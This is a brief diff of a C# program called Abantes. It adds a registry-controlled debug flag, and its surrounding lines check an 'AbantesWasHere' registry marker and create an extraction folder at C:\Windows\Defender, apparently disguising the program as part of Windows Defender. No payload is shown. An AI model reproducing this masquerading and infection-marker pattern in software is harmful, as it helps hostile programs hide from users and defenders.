@@ -18,12 +18,23 @@ namespace Abantes
 {
     public partial class MainThread : Form
     {
+        /* 
+         * Mode 0 is the normal mode.
+         * Mode 1 is debug mode.
+         */
+        public static int Mode = 0;
+
         public MainThread()
         {
             InitializeComponent();
+
             if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
+
+            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "Debug", null) == null) { } else { Mode = 1; }
+
             RegistryKey editKey;
             string extractPath = @"C:\Windows\Defender";
+
             if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
             {
                 Directory.CreateDirectory(@"C:\Windows\Defender");
